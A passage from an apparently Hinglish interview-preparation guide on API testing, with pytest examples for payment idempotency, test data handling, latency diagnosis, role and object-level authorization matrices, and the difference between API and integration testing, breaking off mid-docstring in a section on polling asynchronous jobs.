> same key produces exactly one charge. That last one is the real-world case — a 504 means the
> response didn't arrive, not that the work didn't happen, so the database may well have
> committed after the proxy gave up.
>
> Concurrency next. Two simultaneous charges against the same order must produce exactly one
> success. I'd write that as a thread pool test and scale it up to widen the race window,
> because passing at two proves very little. I've done exactly this shape of test on our budget
> carve endpoint at Merlin — two concurrent carves on the same scope, and I assert exactly one
> 201 and one 409, then read the state back to confirm one record. The important detail there
> is that it's enforced by a database-level unique partial index rather than an application
> check, because an application 'check then insert' has a race window between the check and
> the insert where both requests pass.
>
> Money representation. I check that amounts are integers in minor units or decimal strings,
> never floats — I inspect the raw JSON text rather than the parsed value, because parsing to
> a Python float already loses the evidence. I test currency handling: mismatched currency
> between order and payment must be rejected, not silently converted; zero-decimal currencies
> like JPY behave differently; and I round-trip an amount with precision to confirm it comes
> back exactly.
>
> The state machine, exhaustively. Every state crossed with every transition — you can't
> capture an already-refunded payment, can't refund more than was captured, can't refund twice,
> can't void after capture. Partial refunds summing beyond the original must fail. And for
> every invalid transition I assert not just the 409 but that the state genuinely didn't
> change, because a rejected request that still mutated something is the worst outcome.
>
> Security has hard rules here. Card data must never appear in a response, a log, or an error
> message — I'd grep the whole response and any log I can reach for PAN patterns and CVV. Only
> the last four digits and the brand should ever come back. I'd confirm we're not storing what
> PCI forbids storing, and that the integration is tokenised so raw card data never touches our
> servers in the first place.
>
> Webhooks, because payment providers are asynchronous. The signature must be verified over the
> raw bytes, old timestamps rejected, duplicate events deduplicated by event id, and
> out-of-order delivery handled — a `payment.succeeded` can genuinely arrive after a
> `payment.refunded`, and applying whatever came last would be wrong.
>
> And finally reconciliation, which is the test people skip: after a run of operations, the sum
> of our recorded transactions must match the provider's reported total. That's the assertion
> that catches the errors none of the individual tests do.
>
> On environments — I'd use the provider's sandbox with their documented test cards, including
> the ones that deliberately fail: declined, insufficient funds, expired, 3DS challenge
> required, and the network-error simulation. I would never test against production, and I'd
> want a hard rail in the config that refuses to run if the base URL looks like production,
> because a destructive suite pointed at real payments is not a recoverable mistake."

---

## Q5. "How do you handle test data for API tests?"

### Strategies comparison

| Strategy | Kaise | Pros | Cons | Kab |
|---|---|---|---|---|
| **Create per test** | Test khud API se banata hai, teardown pe delete | Fully isolated, parallel-safe, self-documenting | Slow if setup heavy; needs create+delete endpoints | **Default** |
| **Shared fixtures** | Ek baar bana ke sab tests use karte hain | Fast | Tests couple ho jaate hain, order matter karta hai, parallel mein race | Read-only reference data |
| **Seeded database** | Known dataset load karo run se pehle | Realistic volume, complex relations | Reset mechanism chahiye, drift karta hai | Performance tests |
| **Ephemeral env** | Har run pe fresh env (docker-compose / k8s namespace) | Perfect isolation | Infra cost, slow startup | Nightly / release |
| **Production clone (masked)** | Real data, PII masked | Realistic edge cases | Compliance risk, heavy | Performance / migration |

> **Interview answer:**
>
> "My default is create-per-test with guaranteed teardown, because it's the only strategy that
> makes tests genuinely independent — and independence is what lets me run in parallel and in
> any order, which is where most of the value is.
>
> Concretely: a factory fixture creates whatever the test needs through the API, records every
> id it created, and deletes them in a finalizer that runs whether the test passed or failed.
> Everything gets a UUID-suffixed name, so two parallel runs can't collide on a unique
> constraint. The reason I create through the API rather than inserting into the database
> directly is that database seeding bypasses validation and business rules, so you can
> construct states the application would never produce — and then you're testing a fiction.
>
> I do make exceptions. Reference data — currencies, roles, the tenant itself — is
> session-scoped and read-only, because recreating it per test is pure waste and nothing
> mutates it. For performance tests I want realistic volume, so a seeded dataset makes sense
> there; you can't measure deep pagination against three records.
>
> Three practices I'd call out as the ones that actually matter. First, tests must never depend
> on data they didn't create. The moment a test asserts on a record someone else made, it
> becomes order-dependent and it will start failing for reasons unrelated to the code. Second,
> cleanup has to be a fixture finalizer, not code at the end of the test body — because code
> at the end doesn't run when an assertion fails, and then failing tests poison subsequent
> runs. Third, I'd add a scheduled janitor that deletes anything matching the test naming
> prefix older than a day, because teardown will eventually fail — a crashed runner, a network
> blip — and without a sweeper the environment slowly fills with orphans until unrelated tests
> start timing out.
>
> On secrets and PII: credentials come from environment variables injected by CI, never from a
> committed file, and I don't use real customer data in test environments. If I needed
> production-like data for a migration or performance exercise, it would have to be masked, and
> I'd treat that as a decision with compliance implications rather than a convenience."

> **Cross-question: "Your test creates data but the DELETE endpoint doesn't exist. Now what?"**
>
> "Then I need a different isolation axis, and I'd pick one rather than accept shared mutable
> state. The cleanest is scoping: create a fresh parent container per test — in our case a
> throwaway budget or project — so the data the test creates is unreachable from other tests
> even though it persists. Failing that, I'd make the test tolerant by construction: assert on
> the specific records it created by id rather than on collection counts, so leftover data
> can't affect the outcome. And I'd raise the missing delete endpoint as a testability gap with
> a concrete cost attached — not 'we'd like a delete endpoint', but 'without one the
> environment accumulates records indefinitely, which will eventually degrade query performance
> and make list-based assertions unusable'. Framing it as a real consequence is usually what
> gets it prioritised."

---

## Q6. "An endpoint is slow. How do you investigate?"

### Investigation funnel — pehle ye diagram bolo

```
"Endpoint slow hai"
        |
        v
STEP 0: QUANTIFY  — "slow" kitna? kiske liye? kab se?
        p50/p95/p99, kis payload pe, kis environment pe, kab se
        |
        v
STEP 1: ISOLATE THE LAYER  — kaunsi layer slow hai?
        client -> DNS/TLS -> CDN -> LB -> gateway -> app -> DB
        |
        v
STEP 2: ISOLATE THE INPUT  — sab requests slow hain ya kuch?
        payload size? filter values? tenant? user? time of day?
        |
        v
STEP 3: ISOLATE THE OPERATION  — app ke andar kahan?
        APM trace / span breakdown: DB, external calls, serialization
        |
        v
STEP 4: HYPOTHESIS + PROOF  — reproduce karo, evidence do
```

### Step 0 — quantify

```python
def test_quantify_slowness(api, project_id):
    """'Slow hai' actionable nahi hai. Numbers actionable hain."""
    profile = latency_profile(
        lambda: api.get(f"/api/v1/projects/{project_id}/sales", raise_on_status=False),
        n=200)
    print(f"p50={profile['p50']:.0f}ms p95={profile['p95']:.0f}ms "
          f"p99={profile['p99']:.0f}ms max={profile['max']:.0f}ms")

    # Do alag signatures:
    #   p50 high, p99/p50 ratio low  -> UNIFORMLY slow (algorithm/query problem)
    #   p50 low, p99/p50 ratio high  -> TAIL problem (GC, pool contention, cold cache)
    ratio = profile["p99"] / profile["p50"]
    print(f"Tail ratio p99/p50 = {ratio:.1f}x")
```

### Step 1 — layer isolation with curl timing

```bash
# curl ka timing breakdown — layer isolate karne ka sabse fast tareeka
cat > curl-format.txt <<'FMT'
    dns_lookup:      %{time_namelookup}s
    tcp_connect:     %{time_connect}s
    tls_handshake:   %{time_appconnect}s
    pre_transfer:    %{time_pretransfer}s
    ttfb:            %{time_starttransfer}s     <- SERVER PROCESSING TIME
    total:           %{time_total}s
    download_size:   %{size_download} bytes
    speed:           %{speed_download} bytes/s
FMT

curl -w "@curl-format.txt" -o /dev/null -s \
  -H "Authorization: Bearer $TOKEN" \
  https://staging.merlinai.co/api/v1/projects/p_1/sales
```

**Interpretation:**

| Pattern | Matlab |
|---|---|
| `dns_lookup` high | DNS resolver problem — infra, app nahi |
| `tls_handshake` high | TLS negotiation slow, ya connection reuse nahi ho raha |
| `ttfb - pretransfer` high | **Server processing slow** — yahi asli problem hai |
| `total - ttfb` high | **Payload bada hai / bandwidth** — server fast hai, transfer slow |

Ye distinction critical hai: **TTFB server ka time hai, total-minus-TTFB network ka.** Agar
response 8 MB ka hai aur TTFB 50ms hai, endpoint slow nahi hai — response bada hai.

```python
def test_separate_server_time_from_transfer_time(api, project_id):
    """r.elapsed sirf headers tak ka time hai (TTFB).
    Poora body download alag measure karo."""
    r = api.get(f"/api/v1/projects/{project_id}/sales", stream=True)
    ttfb = r.elapsed.total_seconds()
    t0 = time.perf_counter()
    body = r.content
    transfer = time.perf_counter() - t0

    print(f"TTFB (server): {ttfb*1000:.0f}ms")
    print(f"Transfer:      {transfer*1000:.0f}ms")
    print(f"Payload size:  {len(body)/1024:.1f} KB")

    if len(body) > 500 * 1024:
        print("[FINDING] Response >500KB — pagination ya field projection missing?")
    assert r.headers.get("Content-Encoding") == "gzip", \
        "Response gzip compressed nahi hai — bandwidth waste"
```

### Step 2 — input isolation

```python
@pytest.mark.parametrize("params,label", [
    ({"pageSize": 1},                  "1 record"),
    ({"pageSize": 20},                 "20 records"),
    ({"pageSize": 100},                "100 records"),
    ({"pageSize": 20, "status": "OPEN"}, "filtered"),
    ({"pageSize": 20, "sort": "-createdAt"}, "sorted"),
    ({"pageSize": 20, "include": "lineItems,customer"}, "with expansions"),
    ({"page": 500, "pageSize": 20},    "deep page"),
])
def test_which_input_dimension_is_slow(api, project_id, params, label):
    """Ek dimension ek baar mein badlo. Jahan time jumps, wahi culprit hai."""
    api.get(f"/api/v1/projects/{project_id}/sales", params=params)   # warm
    t0 = time.perf_counter()
    r = api.get(f"/api/v1/projects/{project_id}/sales", params=params)
    print(f"{label:25s}: {(time.perf_counter()-t0)*1000:7.0f}ms  "
          f"({len(r.content)/1024:.0f} KB)")


def test_is_it_tenant_specific(api_org_a, api_org_b):
    """Slowness sirf ek tenant pe? -> unke data volume ya
    unke org-specific config pe kuch hai. Ye ek bada clue hai."""
    for name, client in [("org A", api_org_a), ("org B", api_org_b)]:
        t0 = time.perf_counter()
        client.get("/api/v1/projects/p_1/sales")
        print(f"{name}: {(time.perf_counter()-t0)*1000:.0f}ms")
```

### Step 3 — inside the app

```
APM trace (New Relic / Datadog / Jaeger) ka span breakdown:

  GET /api/v1/projects/p_1/sales     total 3200ms
    ├── auth filter                        12ms
    ├── tenant filter                       4ms
    ├── controller                       3180ms
    │     ├── saleRepo.findByProject()     45ms   <- 1 query
    │     ├── [loop over 100 sales]
    │     │     ├── customerRepo.findById() 28ms  ┐
    │     │     ├── customerRepo.findById() 27ms  │ 100 baar
    │     │     ├── ... x 100               ...   ┘  = 2800ms
    │     └── serialization                290ms
    └── response write                      4ms

  DIAGNOSIS: N+1 query. 1 query + 100 queries.
  FIX: batch fetch — customerRepo.findAllById(ids) — ek IN query
```

**Agar APM nahi hai, indirect evidence:**

```python
def test_n_plus_one_signature(api, project_id):
    """N+1 ka signature: time record count ke saath LINEAR badhta hai,
    aur ek nested expansion add karne se dramatically badhta hai."""
    timings = {}
    for size in (1, 10, 50, 100):
        api.get(f"/api/v1/projects/{project_id}/sales", params={"pageSize": size})
        t0 = time.perf_counter()
        api.get(f"/api/v1/projects/{project_id}/sales", params={"pageSize": size})
        timings[size] = time.perf_counter() - t0

    per_record = {k: v / k * 1000 for k, v in timings.items()}
    print("Per-record cost:", {k: f"{v:.1f}ms" for k, v in per_record.items()})

    # Agar per-record cost CONSTANT rehta hai (aur high hai) -> N+1
    # Agar per-record cost GIRTA hai as size badhta hai -> normal batching
    values = list(per_record.values())
    assert values[-1] < values[0] * 0.6, (
        f"Per-record cost constant hai ({per_record}) — "
        "har record ke liye alag query ho rahi hai. N+1 pattern."
    )
```

### Common root causes — checklist

| Cause | Signature | Fix |
|---|---|---|
| **N+1 queries** | Time ∝ record count; per-record cost constant | Batch fetch / JOIN / DataLoader |
| **Missing index** | Slow at scale, fast on small data; DB `explain` shows COLLSCAN | Add index |
| **Deep offset pagination** | Page 1 fast, page 500 slow | Cursor pagination |
| **Over-fetching** | Big payload, high transfer time, low TTFB | Field projection, pagination |
| **No compression** | Big payload, no `Content-Encoding: gzip` | Enable gzip/brotli |
| **Synchronous external call** | Time varies with third-party; timeouts | Make async / add cache / circuit breaker |
| **Connection pool exhaustion** | Fine at low concurrency, cliff at high | Increase pool / fix leaks |
| **Cold cache** | First request slow, rest fast; high p99/p50 | Cache warming |
| **GC pauses** | High p99, normal p50, periodic spikes | JVM tuning / reduce allocation |
| **Lock contention** | Slow only under concurrency | Narrower lock scope |
| **Serialization** | Large object graphs; time in serialization span | DTOs instead of entities |

> **Interview answer:**
>
> "I'd resist jumping to a cause and go through four steps, because the first mistake is
> usually optimising the wrong layer.
>
> First, quantify. 'Slow' isn't actionable — p50, p95 and p99 are. And the shape tells me
> something immediately: if p50 is high and the spread is tight, it's uniformly slow, which
> points at an algorithm or a query. If p50 is fine and p99 is ten or twenty times higher,
> it's a tail problem, which points at garbage collection, connection pool contention, or a
> cold cache. Those are completely different investigations, so I want to know which one I'm in
> before I look at any code. I'd also establish when it started and whether it correlates with
> a deploy or a data growth curve.
>
> Second, isolate the layer. The fastest tool here is curl's timing breakdown — DNS, TCP, TLS
> handshake, time to first byte, and total. Time to first byte minus pre-transfer is server
> processing; total minus TTFB is payload transfer. That single distinction resolves a lot of
> 'slow endpoint' reports, because if TTFB is fifty milliseconds and the total is three seconds
> on an eight-megabyte response, the endpoint isn't slow — the response is too big, and the fix
> is pagination or field projection or gzip, not query tuning. I'd also check response headers
> for a CDN or gateway signature to confirm which layer actually answered.
>
> Third, isolate the input. I vary one dimension at a time — page size, whether a filter is
> applied, whether a sort is applied, whether related entities are expanded, and how deep the
> page is. Where the time jumps is the culprit. I'd also check whether it's tenant-specific,
> because in a multi-tenant system slowness that only affects one org usually means their data
> volume or their configuration is the trigger, which changes the fix entirely.
>
> Fourth, get inside the request. With APM I'd look at the span breakdown for a single trace —
> that's where an N+1 is unmistakable, because you see one query followed by a hundred nearly
> identical ones. Without APM I can infer it: I measure cost per record at several page sizes,
> and if the per-record cost stays constant instead of falling as the batch grows, each record
> is doing its own round trip.
>
> Then I report a hypothesis with evidence rather than a symptom. Not 'the sales endpoint is
> slow' — 'the sales list endpoint issues one query plus one per result; at page size 100 that
> is 101 queries and 2.8 of the 3.2 seconds; here is the trace id and the correlation id'.
> That's a report a developer can act on the same day."

> **Cross-question: "It's only slow in production, not in staging. What now?"**
>
> "That difference is itself the most useful clue, so I'd enumerate what actually differs
> rather than guess. Data volume is the usual answer — a missing index is invisible on ten
> thousand rows and fatal on ten million, and the way to confirm it is to run the query plan on
> both, because a collection scan will show up explicitly. Concurrency is the next candidate:
> staging typically has one user and production has hundreds, so pool exhaustion and lock
> contention only appear there — I'd reproduce that by driving concurrency up in staging rather
> than assuming. Then configuration and topology: cache sizes, connection pool limits, replica
> counts, and whether production reads from a replica with lag that staging doesn't have. And
> finally the data itself — one tenant with an unusual shape, like a project with fifty
> thousand sales, can be the entire story. If I can't reproduce it, I'd argue for the ability
> to: a staging dataset scaled to production volume is a testability investment that pays for
> itself the first time it catches something."

---

## Q7. "How do you test authorization across roles at scale?"

### Matrix-driven approach — the code

```python
# tests/security/test_authorization_matrix.py
"""
Problem: 6 roles x 40 endpoints = 240 combinations.
Hand-written tests = unmaintainable, aur negative cases chhoot jaate hain.

Solution: ek DECLARATIVE matrix. Naya endpoint = ek row.
"""
import pytest

ROLES = ["ADMIN", "SALES_MANAGER", "PROJECT_MANAGER", "SITE_ENGINEER", "VIEWER", "OTHER_ORG"]

# endpoint -> (method, path_template, roles jo ALLOWED hain)
# Baaki sab DENIED hone chahiye — ye implicit hai, aur yahi asli test hai
ENDPOINT_MATRIX = [
    ("GET",    "/api/v1/projects/{project_id}/sales",       {"ADMIN", "SALES_MANAGER", "PROJECT_MANAGER", "SITE_ENGINEER", "VIEWER"}),
    ("GET",    "/api/v1/sales/{sale_id}/spine",             {"ADMIN", "SALES_MANAGER", "PROJECT_MANAGER"}),
    ("POST",   "/api/v1/budgets/{budget_id}/carve",         {"ADMIN", "SALES_MANAGER"}),
    ("POST",   "/api/v1/budgets/{budget_id}/convert-to-offer", {"ADMIN", "SALES_MANAGER"}),
    ("GET",    "/api/v1/budgets/{budget_id}/coverage",      {"ADMIN", "SALES_MANAGER", "PROJECT_MANAGER", "VIEWER"}),
    ("POST",   "/api/v1/sales/{sale_id}/close",             {"ADMIN", "SALES_MANAGER"}),
    ("DELETE", "/api/v1/sales/{sale_id}",                   {"ADMIN"}),
]

# Sample bodies — validation errors ko authorization errors se alag karne ke liye
BODIES = {
    "/api/v1/budgets/{budget_id}/carve": {"scopeId": "sc_civil", "amount": 1000, "currency": "INR"},
    "/api/v1/sales/{sale_id}/close": {"reason": "COMPLETED"},
}


def _ids(fixtures):
    return {"project_id": fixtures.project_id, "sale_id": fixtures.sale_id,
            "budget_id": fixtures.budget_id}


@pytest.mark.security
@pytest.mark.parametrize("method,path,allowed_roles",
                         ENDPOINT_MATRIX,
                         ids=[f"{m}:{p}" for m, p, _ in ENDPOINT_MATRIX])
@pytest.mark.parametrize("role", ROLES)
def test_authorization_matrix(clients, matrix_fixtures, method, path, allowed_roles, role):
    """7 endpoints x 6 roles = 42 tests. Naya endpoint = ek line.
    Aur DENIAL cases automatically generate hote hain — wahi bugs pakadte hain."""
    client = clients[role]
    url = path.format(**_ids(matrix_fixtures))
    body = BODIES.get(path)

    r = client.request(method, url, json=body, raise_on_status=False)

    if role == "OTHER_ORG":
        # Cross-tenant: 404, 403 nahi — existence leak nahi honi chahiye
        assert r.status_code == 404, (
            f"{method} {path} as OTHER_ORG returned {r.status_code}. "
            "Expected 404 — 403 leaks that the resource exists; "
            "2xx means tenant isolation is broken."
        )
    elif role in allowed_roles:
        assert r.status_code < 400 or r.status_code in (409, 422), (
            f"{method} {path} as {role} returned {r.status_code} — "
            f"should be allowed. Body: {r.text[:200]}"
        )
    else:
        assert r.status_code == 403, (
            f"PRIVILEGE ESCALATION: {method} {path} as {role} returned "
            f"{r.status_code}, expected 403"
        )


@pytest.mark.security
@pytest.mark.parametrize("method,path,allowed_roles", ENDPOINT_MATRIX)
def test_denied_requests_have_no_side_effect(clients, matrix_fixtures, snapshot_state,
                                             method, path, allowed_roles):
    """403 dena kaafi nahi — kuch hua bhi nahi hona chahiye.
    Kabhi-kabhi authorization check WRITE ke baad hota hai."""
    if method == "GET":
        pytest.skip("read-only")

    denied_role = next(r for r in ROLES if r not in allowed_roles and r != "OTHER_ORG")
    before = snapshot_state()
    clients[denied_role].request(method, path.format(**_ids(matrix_fixtures)),
                                 json=BODIES.get(path), raise_on_status=False)
    after = snapshot_state()
    assert before == after, f"{method} {path} as {denied_role} was denied but changed state"
```

### Object-level authorization (IDOR) — role matrix se alag

```python
@pytest.mark.security
@pytest.mark.parametrize("resource_type,path", [
    ("sale",   "/api/v1/sales/{id}"),
    ("budget", "/api/v1/budgets/{id}/coverage"),
    ("carve",  "/api/v1/carves/{id}"),
])
def test_idor_same_role_different_owner(api_user_a, api_user_b, resource_type, path,
                                        resources_owned_by_b):
    """SABSE COMMON authorization bug: role check hai, OWNERSHIP check nahi.
    User A aur User B dono SALES_MANAGER hain — role check pass ho jaata hai —
    lekin A ko B ka resource nahi dikhna chahiye.

    Ye 'Broken Object Level Authorization' hai, OWASP API Top 10 ka #1."""
    resource_id = resources_owned_by_b[resource_type]
    r = api_user_a.get(path.format(id=resource_id), raise_on_status=False)
    assert r.status_code in (403, 404), (
        f"IDOR: user A ({resource_type} owned by B) got {r.status_code}. "
        "Role-level check passed but object-level ownership was never verified."
    )
```

### Coverage report — matrix ko visible banao

```python
def test_print_authorization_coverage_matrix(clients, matrix_fixtures, capsys):
    """Matrix print karo. Ye artifact PO/security reviewer ko dikhaya ja sakta hai —
    wo dekh ke bol sakte hain 'ye cell galat hai'.
    200 individually-named test functions ke saath ye possible nahi."""
    rows = []
    for method, path, allowed in ENDPOINT_MATRIX:
        cells = []
        for role in ROLES:
            r = clients[role].request(method, path.format(**_ids(matrix_fixtures)),
                                      json=BODIES.get(path), raise_on_status=False)
            cells.append("ALLOW" if r.status_code < 400 else f"{r.status_code}")
        rows.append((f"{method} {path}", cells))

    header = f"{'ENDPOINT':<50} " + " ".join(f"{r[:8]:>8}" for r in ROLES)
    print("\n" + header)
    print("-" * len(header))
    for name, cells in rows:
        print(f"{name:<50} " + " ".join(f"{c:>8}" for c in cells))
```

Output:

```
ENDPOINT                                              ADMIN SALES_MA PROJECT_ SITE_ENG   VIEWER OTHER_OR
------------------------------------------------------------------------------------------------------
GET /api/v1/projects/{project_id}/sales               ALLOW    ALLOW    ALLOW    ALLOW    ALLOW      404
GET /api/v1/sales/{sale_id}/spine                     ALLOW    ALLOW    ALLOW      403      403      404
POST /api/v1/budgets/{budget_id}/carve                ALLOW    ALLOW      403      403      403      404
POST /api/v1/budgets/{budget_id}/convert-to-offer     ALLOW    ALLOW      403      403      403      404
GET /api/v1/budgets/{budget_id}/coverage              ALLOW    ALLOW    ALLOW      403    ALLOW      404
POST /api/v1/sales/{sale_id}/close                    ALLOW    ALLOW      403      403      403      404
DELETE /api/v1/sales/{sale_id}                        ALLOW      403      403      403      403      404
```

### Endpoint discovery — nothing falls off the matrix

```python
def test_every_route_is_in_the_authorization_matrix():
    """Sabse important scaling problem: naya endpoint add hota hai
    aur koi matrix mein daalna bhool jaata hai — wo silently untested reh jaata hai.

    Fix: OpenAPI spec (ya route listing) se saare routes nikaalo
    aur assert karo ki har route matrix mein hai."""
    spec = requests.get(f"{BASE_URL}/v3/api-docs", timeout=30).json()
    actual_routes = {
        (method.upper(), path)
        for path, methods in spec["paths"].items()
        for method in methods
        if method.upper() in {"GET", "POST", "PUT", "PATCH", "DELETE"}
    }
    covered = {(m, p) for m, p, _ in ENDPOINT_MATRIX}

    # Path templates normalize karo ({id} vs {sale_id})
    def norm(p):
        return re.sub(r"\{[^}]+\}", "{}", p)

    missing = {r for r in actual_routes if norm(r[1]) not in {norm(c[1]) for c in covered}}
    assert not missing, (
        f"{len(missing)} routes authorization matrix mein nahi hain:\n" +
        "\n".join(f"  {m} {p}" for m, p in sorted(missing))
    )
```

> **Interview answer:**
>
> "I'd drive it as a declarative matrix rather than hand-written tests, because with six roles
> and forty endpoints you're at two hundred and forty combinations, and nobody maintains that
> by hand — what actually happens is people write the positive cases and skip the negatives,
> which is exactly backwards, because the negatives are where the bugs are.
>
> So I define the roles once, and each endpoint once as a row: method, path, and the set of
> roles that should be allowed. Everything not in that set must be denied — that's implicit, so
> the denial cases come for free. pytest's parametrize crosses roles against endpoints, and
> adding a new endpoint to full coverage is one line. In our multi-tenant system I keep a
> special role for a user in another org, and for that one I assert 404 rather than 403,
> because 403 confirms the resource exists and lets someone enumerate ID space.
>
> Three things I'd add beyond the basic matrix. First, denied requests must have no side
> effect. A 403 isn't sufficient — I snapshot the relevant state before and after, because
> authorization checks are sometimes placed after the write, and a rejected request that still
> mutated something is worse than one that succeeded. Second, role-level authorization isn't
> object-level authorization, and conflating them is the single most common real bug. Two users
> can both be SALES_MANAGER, so the role check passes for both — but user A must not be able to
> read user B's sale. That's Broken Object Level Authorization, the top item in the OWASP API
> list, and it needs its own test dimension: same role, different owner. Third, and this is the
> one that makes it actually scale — I have a test that pulls every route from the OpenAPI spec
> and asserts each one appears in the matrix. Without that, the real failure mode isn't a wrong
> cell, it's a new endpoint that nobody added, silently untested.
>
> One side benefit worth mentioning: I print the matrix as a table in the test output. A
> product owner or a security reviewer can read that and say 'that cell is wrong', which they
> could never do with two hundred individually named test functions. It turns test coverage
> into a reviewable artefact."

> **Cross-question: "What if permissions are dynamic — per-project, not per-role?"**
>
> "Then the role is the wrong axis and I'd model the real one. Usually that's a grant: a
> subject, a resource, and a permission. So the matrix becomes permissions crossed with
> endpoints, and I set up fixtures that provision a specific grant — a user who is a manager on
> project A and has nothing on project B — then assert the same endpoint succeeds for A and
> returns 404 for B with the same credentials. The principle doesn't change; only the
> dimension does. And I'd add the transition cases, which are where dynamic permissions
> actually break: what happens to an in-flight session when a grant is revoked, and how quickly
> does the revocation take effect. If permissions are cached in the JWT, a revoked user keeps
> their access until the token expires — that's a legitimate design given short token
> lifetimes, but it needs to be a stated decision with a bounded window, and I'd test what that
> window actually is rather than assume."

---

## Q8. "What's the difference between API testing and integration testing?"

### Ye do alag axes hain — yahi answer ka core hai

Log inhe confuse karte hain kyunki wo overlap karte hain. Lekin ye **do alag questions** ka
jawab dete hain:

```
API testing        = INTERFACE ke through test karna
                     (sawaal: "kis DOOR se main andar ja raha hoon?")
                     Ye ek ENTRY POINT hai, ek scope nahi.

Integration testing = do ya zyada components ke BEECH ka connection test karna
                     (sawaal: "main kitne components ek saath test kar raha hoon?")
                     Ye ek SCOPE hai, ek entry point nahi.
```

Isliye ye orthogonal hain — aap **API ke through unit test bhi kar sakte ho aur integration
test bhi**:

| | Chhota scope | Bada scope |
|---|---|---|
| **API entry point** | Ek endpoint, dependencies mocked → "API component test" | Ek endpoint jo real DB + real downstream services hit karta hai → **API integration test** |
| **UI entry point** | Ek component, API mocked → "component test" | Poora browser journey, real backend → **E2E test** |

### Concrete example — teeno ek hi feature pe

```python
# 1. UNIT TEST (developer likhta hai, API involved nahi)
def test_carve_service_rejects_over_budget():
    """Sirf business logic. Koi HTTP nahi, koi DB nahi — sab mocked."""
    repo = Mock()
    repo.find_budget.return_value = Budget(total=1000, carved=900)
    service = CarveService(repo)
    with pytest.raises(OverBudgetError):
        service.carve(budget_id="b1", scope="sc1", amount=200)


# 2. API TEST, chhota scope (ek endpoint, downstream mocked)
def test_carve_endpoint_returns_409_on_over_budget(api, budget_id, mock_notification_service):
    """API interface ke through, lekin notification service mocked hai.
    Ye API testing hai — aur integration testing NAHI hai,
    kyunki main seams ko real nahi chhod raha."""
    r = api.post(f"/api/v1/budgets/{budget_id}/carve",
                 json={"scopeId": "sc_1", "amount": 99999999})
    assert r.status_code == 409


# 3. API TEST jo INTEGRATION TEST bhi hai (real DB, real seams)
def test_carve_updates_coverage_and_emits_event(api, budget_id, event_listener):
    """Ye DONO hai:
      - API testing (HTTP interface ke through)
      - Integration testing (controller + service + real MongoDB +
                             unique index + event publisher, sab real)"""
    api.post(f"/api/v1/budgets/{budget_id}/carve",
             json={"scopeId": "sc_civil", "amount": 250_000, "currency": "INR"})

    coverage = api.get(f"/api/v1/budgets/{budget_id}/coverage").json()
    assert coverage["carvedAmount"] == 250_000            # DB integration

    event = event_listener.wait_for("budget.carved", timeout=10)
    assert event["budgetId"] == budget_id                  # messaging integration


# 4. E2E TEST (UI entry point, poora stack)
def test_user_can_carve_budget_from_ui(page, api_admin):
    page.goto(f"/budgets/{budget_id}")
    page.get_by_role("button", name="Carve").click()
    page.fill("[name=amount]", "250000")
    page.get_by_role("button", name="Confirm").click()
    expect(page.get_by_test_id("coverage-percent")).to_have_text("2.5%")
```

### Comparison table

| Dimension | API testing | Integration testing |
|---|---|---|
| **Ye kya define karta hai** | Entry point (HTTP interface) | Scope (kitne components) |
| **Sawaal** | "Kya ye endpoint sahi behave karta hai?" | "Kya ye components saath mein sahi kaam karte hain?" |
| **Dependencies** | Mocked ya real — dono ho sakte hain | **Real** (yahi point hai) |
| **UI chahiye** | Nahi | Nahi (lekin ho sakta hai) |
| **Kya pakadta hai** | Contract violations, validation gaps, auth holes, status codes | **Seam failures** — wiring, config, data format mismatch |
| **Kya MISS karta hai** | Agar dependencies mocked hain to seam bugs | Component-internal logic edge cases |
| **Speed** | Fast (mocked) se medium (real) | Medium se slow |
| **Flakiness** | Low | Higher — real infra involved |
| **Kaun likhta hai** | QA + dev | Dev (usually), QA (increasingly) |

> **Interview answer:**
>
> "They're not on the same axis, which is why people find them confusing. API testing describes
> the *entry point* — I'm exercising the system through its HTTP interface rather than through
> a UI or a function call. Integration testing describes the *scope* — how many components are
> real in the test. So they're orthogonal, and a test can be both, or either one alone.
>
> An API test with the database and downstream services mocked is API testing but not
> integration testing — it verifies the contract, the validation and the authorization, and
> nothing about wiring. An API test hitting a real database, real indexes and a real event
> publisher is both. A unit test on the carve service with a mocked repository is neither. And a
> Playwright test driving the browser against the full stack is integration testing at maximum
> scope through a different entry point.
>
> The distinction matters because they catch different bug classes. API testing catches contract
> violations, validation gaps, wrong status codes and authorization holes. Integration testing
> catches seam failures — configuration, wiring, and mismatched assumptions between components.
>
> I learned that difference the hard way. Our backend had fifty-seven passing integration tests
> covering token forgery, replay, expiry and cross-org access, and the end-to-end flow was still
> broken — because every test minted its own token and passed its own customerId. Each test
> proved the component behaved correctly given inputs the test itself constructed. Nobody had
> tested that the identity in a token issued by one component matches the identity a different
> component resolves. They were labelled integration tests, and by scope they were, but the
> specific seam that mattered was never crossed.
>
> So the rule I took from that is: if a test manufactures an input that no real client could
> produce, it isn't testing the integration, whatever it's called. At least one test per flow
> should acquire its credentials and its identifiers exactly the way production does, and then
> drive the whole journey with only what that flow hands it."

> **Cross-question: "So are integration tests better? Should we write more of them?"**
>
> "Not uniformly — they cost more and they're less precise. When an integration test fails you
> know something in the chain is broken, but not what; a unit test failure points at a line.
> And they're slower and flakier because real infrastructure is involved. What I'd argue for
> isn't more integration tests, it's better-placed ones: identify the seams that actually carry
> risk — authentication handoffs, tenant scoping, money flowing between services, anything
> asynchronous — and cover those specifically, while leaving logic branches to unit tests.
> Our fifty-seven tests weren't too few. They were pointed at the wrong thing."

---

## Q9. "How would you test an asynchronous API that returns 202 and processes later?"

### Async pattern ka anatomy

```
1. SUBMIT
   POST /api/v1/budgets/b_1/convert-to-offer
   -> 202 Accepted
      Location: /api/v1/jobs/job_7731
      Retry-After: 5
      {"jobId": "job_7731", "status": "QUEUED",
       "statusUrl": "/api/v1/jobs/job_7731"}

2. POLL
   GET /api/v1/jobs/job_7731
   -> 200 {"status": "PROCESSING", "progress": 40}
   -> 200 {"status": "COMPLETED", "resultUrl": "/api/v1/offers/of_9912"}
   -> 200 {"status": "FAILED", "error": {"code": "SCOPE_LOCKED", "message": "..."}}

3. FETCH RESULT
   GET /api/v1/offers/of_9912
   -> 200 {...}

Alternative completion signals:
  - Webhook callback     (push instead of poll)
  - Server-Sent Events   (streaming progress)
  - WebSocket            (bidirectional)
```

### Polling helper — sabse important building block

```python
# framework/async_helpers.py

class JobTimeout(AssertionError):
    pass


def wait_for_job(api, status_url, *, timeout=120, expected_terminal="COMPLETED",
                 initial_interval=1.0, max_interval=10.0):
    """Async job ka poll karo terminal state tak.

    Design decisions jo interview mein bolne layak hain:
      1. NEVER a bare sleep() then a single check — wo flaky hai.
